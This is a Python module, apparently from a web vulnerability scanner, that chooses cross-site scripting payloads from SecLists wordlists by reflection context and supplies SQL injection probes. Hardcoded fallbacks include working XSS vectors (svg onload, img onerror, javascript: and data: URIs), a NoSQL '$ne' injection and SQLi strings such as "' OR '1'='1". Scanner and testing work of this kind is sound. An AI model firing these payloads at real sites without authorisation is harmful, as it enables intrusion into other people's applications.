"""Curated payload library backed by local SecLists/wfuzz collections.

Provides context-appropriate, battle-tested payloads for the proposal
synthesizer instead of hardcoded toy vectors. Payloads are sampled from
curated wordlist files (PortSwigger cheat sheets, polyglots, wfuzz
injection lists) with a small embedded fallback set when files are absent.
"""

from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger("flowforge.heuristics.payload_library")

# Curated source files, ordered by preference per context.
_XSS_ROOTS = [
    "/usr/share/wordlists/seclists/Fuzzing/XSS",
    "/usr/share/seclists/Fuzzing/XSS",
]

_CONTEXT_SOURCES: Dict[str, List[str]] = {
    # Reflection lands in HTML text nodes / generic markup.
    "html_body_text": [
        "robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
        "Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt",
        "robot-friendly/XSS-Jhaddix.txt",
    ],
    "plain_text": [
        "robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
        "robot-friendly/XSS-Fuzzing.txt",
    ],
    # Breakout from inside a <script> block / JS string.
    "html_script_block": [
        "robot-friendly/xss-without-parentheses-semi-colons-portswigger.txt",
        "robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
    ],
    # Event handler / quoted attribute contexts.
    "html_attr_event": [
        "robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
        "robot-friendly/XSS-Bypass-Strings-BruteLogic.txt",
    ],
    "html_attr_quoted": [
        "robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
        "robot-friendly/XSS-Bypass-Strings-BruteLogic.txt",
    ],
    "html_attr_unquoted": [
        "robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
    ],
    # href/src style URI contexts.
    "html_attr_uri": [
        "robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
        "robot-friendly/XSS-EnDe-xssAttacks.txt",
    ],
    "html_comment": [
        "robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt",
    ],
    # JSON string value breakout (embedded set is higher quality than bulk files here).
    "json_value": [],
}

# High-signal embedded fallbacks (used only when SecLists is unavailable).
_EMBEDDED_FALLBACKS: Dict[str, List[str]] = {
    "html_body_text": [
        '"><svg/onload=alert(1)>',
        "<img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "plain_text": [
        '"><svg/onload=alert(1)>',
        "<img src=x onerror=alert(1)>",
    ],
    "html_script_block": [
        "</script><svg onload=alert(1)>",
        "</script><img src=x onerror=alert(1)>",
    ],
    "html_attr_event": [
        '" onfocus=alert(1) autofocus="',
        '" onmouseover="alert(1)" x="',
    ],
    "html_attr_quoted": [
        '"><svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
    ],
    "html_attr_unquoted": [
        " x onfocus=alert(1) autofocus",
    ],
    "html_attr_uri": [
        "javascript:alert(1)",
        "data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",
    ],
    "html_comment": [
        "--><svg onload=alert(1)>",
    ],
    "json_value": [
        '", "injected": ["$ne": null]}',
        '\\u003csvg onload=alert(1)\\u003e',
    ],
}

_MAX_FILE_PAYLOAD_BYTES = 512 * 1024  # never read more than 512 KB of payload lines


def _read_payload_file(path: Path, limit: int) -> List[str]:
    """Read clean payload lines from a curated file (bounded)."""
    payloads: List[str] = []
    try:
        if not path.is_file() or path.stat().st_size > _MAX_FILE_PAYLOAD_BYTES * 8:
            return payloads
        with open(path, "rb") as fh:
            for raw in fh:
                line = raw.decode("utf-8", errors="replace").strip()
                if (
                    not line
                    or line.startswith("#")
                    or len(line) > 512
                    or any(ord(c) < 9 for c in line)
                ):
                    continue
                payloads.append(line)
                if len(payloads) >= limit * 4:
                    break
    except OSError as exc:
        logger.debug("Payload source unavailable %s: %s", path, exc)
    return payloads


def _even_sample(items: List[str], n: int) -> List[str]:
    """Deterministic even sampling without duplicates."""
    if len(items) <= n:
        out = list(dict.fromkeys(items))
        return out[:n]
    step = len(items) / float(n)
    picked: List[str] = []
    seen: set = set()
    for i in range(n):
        val = items[int(i * step)]
        if val not in seen:
            seen.add(val)
            picked.append(val)
    return picked


class PayloadLibrary:
    """Context-to-payload resolver with lazy caching."""

    def __init__(self, per_context: int = 6) -> None:
        self.per_context = per_context
        self._cache: Dict[str, List[str]] = {}

    def get(self, context_key: str) -> List[str]:
        """Return curated payloads for a reflection context key."""
        if context_key in self._cache:
            return self._cache[context_key]
        payloads = self._load(context_key)
        self._cache[context_key] = payloads
        return payloads

    def _resolve_root(self, rel: str) -> Optional[Path]:
        if rel.startswith("/"):
            p = Path(rel)
            return p if p.is_file() else None
        for root in _XSS_ROOTS:
            candidate = Path(root) / rel
            if candidate.is_file():
                return candidate
        return None

    def _load(self, context_key: str) -> List[str]:
        sources = _CONTEXT_SOURCES.get(context_key, [])
        collected: List[str] = []
        for rel in sources:
            path = self._resolve_root(rel)
            if path:
                collected.extend(_read_payload_file(path, self.per_context))
        collected = list(dict.fromkeys(collected))
        # Prefer vectors whose execution marker ('alert(') matches what the
        # verdict engine greps for when confirming reflections downstream.
        alert_vectors = [p for p in collected if "alert(" in p]
        if len(alert_vectors) >= self.per_context:
            collected = alert_vectors
        sampled = _even_sample(collected, self.per_context)
        if len(sampled) < 2:
            fallback = _EMBEDDED_FALLBACKS.get(context_key, [])
            sampled = list(dict.fromkeys(sampled + fallback))[: self.per_context]
        logger.info(
            "PayloadLibrary[%s]: %d curated payloads (%d sources resolved)",
            context_key, len(sampled),
            sum(1 for r in sources if self._resolve_root(r)),
        )
        return sampled

    def sql_injection(self, n: int = 4) -> List[str]:
        for candidate in (
            Path("/usr/share/wordlists/wfuzz/Injections/SQL.txt"),
            Path("/usr/share/wordlists/sqlmap.txt"),
        ):
            if candidate.is_file():
                vals = _read_payload_file(candidate, n)
                vals = [v for v in vals if "'" in v or " OR " in v.upper()]
                if vals:
                    return _even_sample(vals, n)
        return ["'", "' OR '1'='1", "1' ORDER BY 1--+", "' AND SLEEP(0)--+"]


_library: Optional[PayloadLibrary] = None


def get_payload_library() -> PayloadLibrary:
    global _library
    if _library is None:
        _library = PayloadLibrary()
    return _library


def reset_payload_library() -> None:
    global _library
    _library = None
